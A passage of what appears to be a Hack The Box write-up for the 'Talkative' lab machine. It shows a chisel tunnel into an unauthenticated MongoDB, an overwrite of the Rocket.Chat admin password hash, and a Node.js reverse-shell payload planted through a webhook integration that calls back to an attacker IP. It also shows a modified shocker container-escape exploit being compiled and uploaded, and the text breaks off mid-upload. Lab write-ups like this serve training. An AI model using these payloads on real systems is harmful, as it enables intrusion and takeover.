IPv6 address <span class="keyword">for</span> eth0:            dead:beef::250:56ff:feb9:3aae</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">18 updates can be applied immediately.</span><br><span class="line">8 of these updates are standard security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Sun Apr 10 12:46:40 2022 from 172.17.0.13</span><br><span class="line">saul@talkative:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(saul) gid=1000(saul) <span class="built_in">groups</span>=1000(saul)</span><br><span class="line">saul@talkative:~$ <span class="built_in">whoami</span></span><br><span class="line">saul</span><br><span class="line">saul@talkative:~$ <span class="built_in">cat</span> user.txt </span><br><span class="line">e2503f45e99ee3fec7c7a4f44c5c87ed</span><br></pre></td></tr></table></figure>
+
+<p>and we get our user flag</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2203.jpg"></li>
+</ul>
+<h1 id="move-on-to-root"><a href="#move-on-to-root" class="headerlink" title="move on to root"></a>move on to root</h1><p>pspy found some interesting process</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2022/04/09 21:31:01 CMD: UID=0    PID=79640  | /bin/sh -c <span class="built_in">cp</span> /root/.backup/passwd /etc/passwd </span><br><span class="line">2022/04/09 21:31:01 CMD: UID=0    PID=84170  | <span class="built_in">cp</span> /root/.backup/shadow /etc/shadow </span><br><span class="line">2022/04/09 21:51:01 CMD: UID=0    PID=84169  | python3 /root/.backup/update_mongo.py </span><br><span class="line">2022/04/09 21:51:01 CMD: UID=0    PID=84172  | python3 /root/.backup/update_mongo.py</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">tcp        0      0 172.17.0.1:6000         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6001         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:8081            0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6002         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:8082            0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6003         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6004         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6005         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6006         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6007         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6008         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6009         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6010         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6011         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6012         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6013         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6014         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.17.0.1:6015         0.0.0.0:*               LISTEN      off (0.00/0/0)</span><br><span class="line">tcp        0      0 172.18.0.1:22           172.17.0.13:37184       ESTABLISHED keepalive (6455.50/0/0)</span><br><span class="line">tcp6       0      0 :::8080                 :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">tcp6       0      0 :::8081                 :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">tcp6       0      0 :::8082                 :::*                    LISTEN      off (0.00/0/0)</span><br><span class="line">udp        0      0 127.0.0.1:39995         127.0.0.53:53           ESTABLISHED off (0.00/0/0)</span><br></pre></td></tr></table></figure>
+
+<p>after ip range and port scan, we known, now use chisel port forward mongo DB 172.17.0.2:27017 and change admins password for rocket.chat</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pwaWxsb3JhL2NoaXNlbA==">chisel<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">saul@talkative:~$ ./chisel client 10.10.14.18:4444 R:27017:172.17.0.2:27017 &amp;</span><br><span class="line">[1] 6493</span><br><span class="line">saul@talkative:~$ 2022/04/10 14:13:52 client: Connecting to ws://10.10.14.18:4444</span><br><span class="line"></span><br><span class="line">saul@talkative:~$ 2022/04/10 14:13:55 client: Connected (Latency 371.579937ms)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/endgame/ascension]</span><br><span class="line">└─<span class="comment"># ./chisel server -p 4444 --reverse</span></span><br><span class="line">2022/04/10 06:04:31 server: Reverse tunnelling enabled</span><br><span class="line">2022/04/10 06:04:31 server: Fingerprint YV//bCvnlszVb4QzNq2stvLbKxLfQ33OQ4mKu6Y5zME=</span><br><span class="line">2022/04/10 06:04:31 server: Listening on http://0.0.0.0:4444</span><br><span class="line">2022/04/10 06:04:37 server: session<span class="comment">#1: tun: proxy#R:27017=&gt;172.17.0.2:27017: Listening</span></span><br></pre></td></tr></table></figure>
+
+<p>now we have to install mongosh to connect to mongodb, and enum some information:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://downloads.mongodb.com/compass/mongodb-mongosh_1.3.1_amd64.deb</span><br><span class="line">$ dpkg -i mongodb-mongosh_1.3.1_amd64.deb</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/talkactive]</span><br><span class="line">└─<span class="comment"># mongosh &quot;mongodb://LOCALHOST:27017&quot; </span></span><br><span class="line">Current Mongosh Log ID: 6252e6b51f6c27d3c8cfc72a</span><br><span class="line">Connecting to:          mongodb://LOCALHOST:27017/?directConnection=<span class="literal">true</span>&amp;appName=mongosh+1.3.1</span><br><span class="line">Using MongoDB:          4.0.26</span><br><span class="line">Using Mongosh:          1.3.1</span><br><span class="line"></span><br><span class="line">For mongosh info see: https://docs.mongodb.com/mongodb-shell/</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line">   The server generated these startup warnings when booting:</span><br><span class="line">   2022-04-10T12:32:16.345+0000: </span><br><span class="line">   2022-04-10T12:32:16.345+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine</span><br><span class="line">   2022-04-10T12:32:16.345+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem</span><br><span class="line">   2022-04-10T12:32:18.390+0000: </span><br><span class="line">   2022-04-10T12:32:18.390+0000: ** WARNING: Access control is not enabled <span class="keyword">for</span> the database.</span><br><span class="line">   2022-04-10T12:32:18.390+0000: **          Read and write access to data and configuration is unrestricted.</span><br><span class="line">   2022-04-10T12:32:18.391+0000: </span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">rs0 [direct: primary] <span class="built_in">test</span>&gt; show databases</span><br><span class="line">admin    106 kB</span><br><span class="line">config   160 kB</span><br><span class="line"><span class="built_in">local</span>   11.9 MB</span><br><span class="line">meteor  5.08 MB</span><br><span class="line">rs0 [direct: primary] <span class="built_in">test</span>&gt; use admin</span><br><span class="line">switched to db admin</span><br><span class="line">rs0 [direct: primary] admin&gt; show tables</span><br><span class="line">system.keys</span><br><span class="line">system.version</span><br><span class="line">rs0 [direct: primary] admin&gt; db.system.keys.find()</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: Long(<span class="string">&quot;6994889321446637571&quot;</span>),</span><br><span class="line">    purpose: <span class="string">&#x27;HMAC&#x27;</span>,</span><br><span class="line">    key: Binary(Buffer.from(<span class="string">&quot;6def3ebf131b6d0197852202f4908cf0f279016e&quot;</span>, <span class="string">&quot;hex&quot;</span>), 0),</span><br><span class="line">    expiresAt: Timestamp(&#123; t: 1636400583, i: 0 &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _id: Long(<span class="string">&quot;6994889321446637572&quot;</span>),</span><br><span class="line">    purpose: <span class="string">&#x27;HMAC&#x27;</span>,</span><br><span class="line">    key: Binary(Buffer.from(<span class="string">&quot;52057603cc02d6cf032aa2d1dc592ad3f8889b06&quot;</span>, <span class="string">&quot;hex&quot;</span>), 0),</span><br><span class="line">    expiresAt: Timestamp(&#123; t: 1644176583, i: 0 &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _id: Long(<span class="string">&quot;7064639126477209602&quot;</span>),</span><br><span class="line">    purpose: <span class="string">&#x27;HMAC&#x27;</span>,</span><br><span class="line">    key: Binary(Buffer.from(<span class="string">&quot;8d89fa517f7aaf2813b681aa0e63bcae2a3238cc&quot;</span>, <span class="string">&quot;hex&quot;</span>), 0),</span><br><span class="line">    expiresAt: Timestamp(&#123; t: 1652640475, i: 0 &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _id: Long(<span class="string">&quot;7064639126477209603&quot;</span>),</span><br><span class="line">    purpose: <span class="string">&#x27;HMAC&#x27;</span>,</span><br><span class="line">    key: Binary(Buffer.from(<span class="string">&quot;ede2184b2b29a5eb05cca53adb9246b73dc3c90f&quot;</span>, <span class="string">&quot;hex&quot;</span>), 0),</span><br><span class="line">    expiresAt: Timestamp(&#123; t: 1660416475, i: 0 &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line">rs0 [direct: primary] admin&gt; use meteor</span><br><span class="line">switched to db meteor</span><br><span class="line">rs0 [direct: primary] meteor&gt; db.users.find()</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: <span class="string">&#x27;rocket.cat&#x27;</span>,</span><br><span class="line">    createdAt: ISODate(<span class="string">&quot;2021-08-10T19:44:00.224Z&quot;</span>),</span><br><span class="line">    avatarOrigin: <span class="string">&#x27;local&#x27;</span>,</span><br><span class="line">    name: <span class="string">&#x27;Rocket.Cat&#x27;</span>,</span><br><span class="line">    username: <span class="string">&#x27;rocket.cat&#x27;</span>,</span><br><span class="line">    status: <span class="string">&#x27;online&#x27;</span>,</span><br><span class="line">    statusDefault: <span class="string">&#x27;online&#x27;</span>,</span><br><span class="line">    utcOffset: 0,</span><br><span class="line">    active: <span class="literal">true</span>,</span><br><span class="line">    <span class="built_in">type</span>: <span class="string">&#x27;bot&#x27;</span>,</span><br><span class="line">    _updatedAt: ISODate(<span class="string">&quot;2021-08-10T19:44:00.615Z&quot;</span>),</span><br><span class="line">    roles: [ <span class="string">&#x27;bot&#x27;</span> ]</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _id: <span class="string">&#x27;ZLMid6a4h5YEosPQi&#x27;</span>,</span><br><span class="line">    createdAt: ISODate(<span class="string">&quot;2021-08-10T19:49:48.673Z&quot;</span>),</span><br><span class="line">    services: &#123;</span><br><span class="line">      password: &#123;</span><br><span class="line">        bcrypt: <span class="string">&#x27;$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG&#x27;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      resume: &#123;</span><br><span class="line">        loginTokens: [</span><br><span class="line">          &#123;</span><br><span class="line">            when: ISODate(<span class="string">&quot;2022-04-10T13:00:11.904Z&quot;</span>),</span><br><span class="line">            hashedToken: <span class="string">&#x27;n3ZC1SRtuFsYyAAcaelzbdMkwWv7bI4IONsiahBenNI=&#x27;</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    emails: [ &#123; address: <span class="string">&#x27;saul@talkative.htb&#x27;</span>, verified: <span class="literal">false</span> &#125; ],</span><br><span class="line">    <span class="built_in">type</span>: <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">    status: <span class="string">&#x27;offline&#x27;</span>,</span><br><span class="line">    active: <span class="literal">true</span>,</span><br><span class="line">    _updatedAt: ISODate(<span class="string">&quot;2022-04-10T13:59:52.416Z&quot;</span>),</span><br><span class="line">    roles: [ <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;bot&#x27;</span> ],</span><br><span class="line">    name: <span class="string">&#x27;Saul Goodman&#x27;</span>,</span><br><span class="line">    lastLogin: ISODate(<span class="string">&quot;2022-04-10T13:00:11.897Z&quot;</span>),</span><br><span class="line">    statusConnection: <span class="string">&#x27;offline&#x27;</span>,</span><br><span class="line">    username: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    utcOffset: 0</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>now we could update admin’s bcrypt hash to change the password:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rs0 [direct: primary] meteor&gt; db.getCollection(<span class="string">&#x27;users&#x27;</span>).update(&#123;username:<span class="string">&quot;admin&quot;</span>&#125;, &#123; <span class="variable">$set</span>: &#123;<span class="string">&quot;services&quot;</span> : &#123; <span class="string">&quot;password&quot;</span> : &#123;<span class="string">&quot;bcrypt&quot;</span> : <span class="string">&quot;$2a$10<span class="variable">$n9CM8OgInDlwpvjLKLPML</span>.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG&quot;</span> &#125; &#125; &#125; &#125;)</span><br><span class="line">DeprecationWarning: Collection.update() is deprecated. Use updateOne, updateMany, or bulkWrite.</span><br><span class="line">&#123;</span><br><span class="line">  acknowledged: <span class="literal">true</span>,</span><br><span class="line">  insertedId: null,</span><br><span class="line">  matchedCount: 1,</span><br><span class="line">  modifiedCount: 1,</span><br><span class="line">  upsertedCount: 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>then use: admin&#x2F;12345 to login into rocket.chat pannel</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2204.jpg"></li>
+</ul>
+<p>we found target is rocket.chat 2.4.14, is vulnerable</p>
+<ul>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDk5NjA=">Rocket.Chat 3.12.1 - NoSQL Injection (Unauthenticated)<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+<li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NzRW5veC9DVkUtMjAyMS0yMjkxMQ==">CVE-2021-22911<i class="fa fa-external-link-alt"></i></span></p>
+</li>
+</ul>
+<p>we can change the following to rev shell:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const require = console.log.constructor(<span class="string">&#x27;return process.mainModule.require&#x27;</span>)();</span><br><span class="line">const &#123; <span class="built_in">exec</span> &#125; = require(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&#x27;command here&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">const require = console.log.constructor(<span class="string">&#x27;return process.mainModule.require&#x27;</span>)();</span><br><span class="line">var net = require(<span class="string">&quot;net&quot;</span>), <span class="built_in">cp</span> = require(<span class="string">&quot;child_process&quot;</span>), sh = cp.spawn(<span class="string">&quot;/bin/sh&quot;</span>, []);</span><br><span class="line">var client = new net.Socket();</span><br><span class="line">client.connect(1234, <span class="string">&quot;10.10.14.18&quot;</span>, <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">  client.pipe(sh.stdin);</span><br><span class="line">  sh.stdout.pipe(client);</span><br><span class="line">  sh.stderr.pipe(client);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>then go to: <span class="exturl" data-url="aHR0cDovL3RhbGthdGl2ZS5odGI6MzAwMC9hZG1pbi9pbnRlZ3JhdGlvbnMvbmV3">http://talkative.htb:3000/admin/integrations/new<i class="fa fa-external-link-alt"></i></span>, select “Incoming WebHook Integration”</p>
+<p>fill in like following pics:</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2205.jpg"></p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2206.jpg"></p>
+</li>
+</ul>
+<p>then copy this url, curl it, we got a shell in a container again</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2207.jpg"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/talkactive]</span><br><span class="line">└─<span class="comment"># curl http://talkative.htb:3000/hooks/23fvWJGcJ7b47SGHy/PWHLFZoXrTQLpM5fT2GMzAgxBNhXKD7k3QD3K8nkHcXWAkEZ</span></span><br><span class="line">&#123;<span class="string">&quot;success&quot;</span>:<span class="literal">false</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/talkactive]</span><br><span class="line">└─<span class="comment"># pwncat-cs -lp 1234</span></span><br><span class="line">[10:45:00] Welcome to pwncat 🐈!                                                                                     __main__.py:164</span><br><span class="line">[10:45:08] received connection from 10.10.11.155:46286                                                                    bind.py:84</span><br><span class="line">[10:45:16] 0.0.0.0:1234: upgrading from /bin/dash to /bin/bash                                                        manager.py:957</span><br><span class="line">[10:45:20] 10.10.11.155:46286: registered new host w/ db                                                              manager.py:957</span><br><span class="line">(<span class="built_in">local</span>) pwncat$ back</span><br><span class="line">(remote) root@c150397ccd63:/app/bundle/programs/server<span class="comment"># ls</span></span><br><span class="line">app                boot.js.map    mini-files.js.map        npm-rebuild.js      npm-shrinkwrap.json  program.json</span><br><span class="line">assets             config.json    node_modules             npm-rebuild.js.map  package.json         runtime.js</span><br><span class="line">boot-utils.js      debug.js       npm                      npm-rebuilds.json   packages             runtime.js.map</span><br><span class="line">boot-utils.js.map  debug.js.map   npm-rebuild-args.js      npm-require.js      profile.js           server-json.js</span><br><span class="line">boot.js            mini-files.js  npm-rebuild-args.js.map  npm-require.js.map  profile.js.map       server-json.js.map</span><br><span class="line">(remote) root@c150397ccd63:/app/bundle/programs/server<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">(remote) root@c150397ccd63:/app/bundle/programs/server<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>after run some linux enum script, found capabilities cap_dac_read_search</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cDovL3N0ZWFsdGgub3BlbndhbGwubmV0L3hTcG9ydHMvc2hvY2tlci5j">shocker: docker PoC VMM-container breakout<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>first Modify the file, then we compile it in our attack kali machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// get a FS reference from something mounted <span class="keyword">in</span> from outside</span><br><span class="line"><span class="keyword">if</span> ((fd1 = open(&quot;/etc/hostname&quot;, O_RDONLY)) &lt; 0)</span><br><span class="line">    die(<span class="string">&quot;[-] open&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (find_handle(fd1, <span class="string">&quot;/root/root.txt&quot;</span>, &amp;root_h, &amp;h) &lt;= 0)</span><br><span class="line">    die(<span class="string">&quot;[-] Cannot find valid handle!&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Dynamic compilation</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc shocker.c -o shocker</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Static compilation</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc -Wall -std=c99 -O2 shocker.c -static</span><br></pre></td></tr></table></figure>
+
+<p>then upload these binary, then execute it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">local</span>) pwncat$ upload ./a.out /root/static</span><br><span class="line">/root/static ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 824.1/824.1 KB • ? • 0:00:00</span><br><span class="line">[10:53:06] uploaded 824.11KiB <span class="keyword">in</span> 13.93 seconds                                                                          upload.py:76</span><br><span class="line">(<span class="built_in">local</span>) pwncat$ upload ./shocker /root/shocker</span><br><span class="line">/root/shocker ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 17.2/17.2 KB • ? • 0:00:00</span><br><span class="line">[10:53:48] uploaded 17.21KiB <span class="keyword">in</span> 4.49 seconds                                                                            upload.py:76</span><br><span class="line">(<span class="built_in">local</span>) pwncat$ upload ./shadow /root/shadow</span><br><span class="line">/root/shadow 